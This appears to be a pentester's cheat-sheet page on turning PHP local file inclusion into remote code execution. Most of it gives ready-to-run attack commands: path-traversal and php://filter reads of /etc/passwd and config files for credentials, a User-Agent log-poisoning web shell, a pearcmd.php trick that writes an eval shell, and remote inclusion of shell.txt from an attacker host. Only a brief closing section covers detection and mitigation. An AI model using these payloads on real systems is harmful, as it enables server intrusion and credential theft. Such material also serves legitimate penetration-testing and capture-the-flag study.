---
title: LFI — from file read to code execution
tags: [web, lfi, rfi, wrappers, log-poisoning]
---

# LFI: from file read to a shell

**English** | [🇪🇸 Español](lfi-to-rce.md)

## 1. Detect and confirm

```bash
curl -s 'http://<HOST>/?page=../../../../etc/passwd'
curl -s 'http://<HOST>/?file=php://filter/convert.base64-encode/resource=index.php'
```

With `include`, `require`, `file_get_contents` or `readfile` taking a parameter, try absolute, relative and `%00` (PHP < 5.3.4). `php://filter` confirms LFI even when the include appends `.php`.

## 2. Read source

```bash
curl -s 'http://<HOST>/?page=php://filter/convert.base64-encode/resource=config.php' | base64 -d
```

That yields credentials, paths and filter logic. Also check `.env`, `wp-config.php`, `config/database.php` and SSH keys.

## 3. Log poisoning

If you can include `/var/log/apache2/access.log` (or `nginx/access.log`), send the payload in `User-Agent`:

```bash
curl -s 'http://<HOST>/' -A '<?php system($_GET["c"]); ?>'
curl -s 'http://<HOST>/?page=/var/log/apache2/access.log&c=id'
```

Alternatives: `auth.log` (SSH username with payload), `error.log`, `/proc/self/environ` (when the process inherits variables), sessions (`/var/lib/php/sessions/sess_<id>`), and `mail.log`.

## 4. Wrappers and modern tricks

- `data://text/plain;base64,<payload>` with `allow_url_include=On`.
- `php://input` with POST and `allow_url_include`.
- `phar://` for deserialization (see [PHP deserialization](php-deserialization.md)).
- `pearcmd.php` on images shipping PEAR: `?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET[c])?>+/tmp/shell.php` (needs `register_argc_argv`).
- PHP filter chains (`wrapwrap`) to generate code without an upload when log inclusion is unavailable.

## 5. When the include does not execute PHP

- Include `/etc/ssh/sshd_config` or keys for lateral movement.
- Writable `~/.bash_history`, `cron`, `authorized_keys`.
- `RFI` with your own server: `?page=http://<LHOST>/shell.txt` if `allow_url_include=On`.

## 6. Typical errors

- **Appends `.php` and breaks the path** → use `php://filter` or a wrapper; `%00` truncation needs old PHP.
- **`allow_url_include` disabled** → drop `data://` and `http://`; go for log poisoning.
- **Log lacks the payload** → the vhost writes elsewhere; try the vhost's `access.log` and `error.log`.
- **`open_basedir` active** → paths are limited; look inside the allowed directory.
- **Payload gets escaped** → encode `<?php` as `<?=` or use base64 when the wrapper allows it.

## 7. Detection and mitigation

- Validate paths against an allowlist; never build paths from user input.
- `allow_url_include=Off`, `open_basedir` and disable unneeded wrappers.
- WAF for `../`, `php://`, `data://` and `%00`.
- Monitor log inclusion and `/etc/passwd` access from the web server.

MITRE: T1190, T1005, T1059.
